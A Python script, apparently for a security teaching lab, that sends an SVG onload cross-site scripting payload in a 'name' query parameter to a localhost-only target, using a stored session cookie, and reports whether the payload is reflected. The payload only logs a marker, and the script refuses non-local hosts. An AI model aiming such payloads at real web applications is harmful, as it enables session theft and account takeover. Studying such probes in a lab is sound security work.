"""Local reflected-XSS submission draft; browser execution remains unverified."""
import argparse
import json
from pathlib import Path
from urllib.error import HTTPError
from urllib.parse import parse_qsl, urlencode, urljoin, urlparse
from urllib.request import HTTPRedirectHandler, Request, build_opener


class NoRedirect(HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None


def local_url(base, path):
    url = urljoin(base.rstrip("/") + "/", path)
    original, target = urlparse(base), urlparse(url)
    if target.scheme not in ("http", "https") or target.hostname not in ("localhost", "127.0.0.1", "::1"):
        raise ValueError("Only a local teaching target is accepted")
    if target.username or target.password or (target.scheme, target.netloc) != (original.scheme, original.netloc):
        raise ValueError("Target must remain on the declared local origin")
    return url


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--base-url", required=True)
    parser.add_argument("--path", required=True)
    parser.add_argument("--cookie-file", type=Path, required=True)
    args = parser.parse_args()
    url = local_url(args.base_url, args.path)
    cookie = args.cookie_file.read_text(encoding="utf-8").strip()
    if "\r" in cookie or "\n" in cookie:
        raise ValueError("Cookie file must contain one header value")
    payload = '<svg onload="console.log(\'LLM_LAB_XSS\')">'
    parsed = urlparse(url)
    query = [(k, v) for k, v in parse_qsl(parsed.query) if k != "name"] + [("name", payload)]
    browser_url = parsed._replace(query=urlencode(query)).geturl()
    request = Request(browser_url, headers={"Cookie": cookie})
    try:
        with build_opener(NoRedirect()).open(request, timeout=10) as response:
            status, body = response.status, response.read().decode("utf-8", errors="replace")
    except HTTPError as exc:
        status, body = exc.code, exc.read().decode("utf-8", errors="replace")
    print(json.dumps({"status": status, "raw_payload_in_response": payload in body, "browser_url": browser_url, "browser_execution": "not_checked", "next_step": "Use the same local authenticated browser session; inspect the console for LLM_LAB_XSS. Reflection alone is insufficient."}, indent=2))


if __name__ == "__main__":
    main()
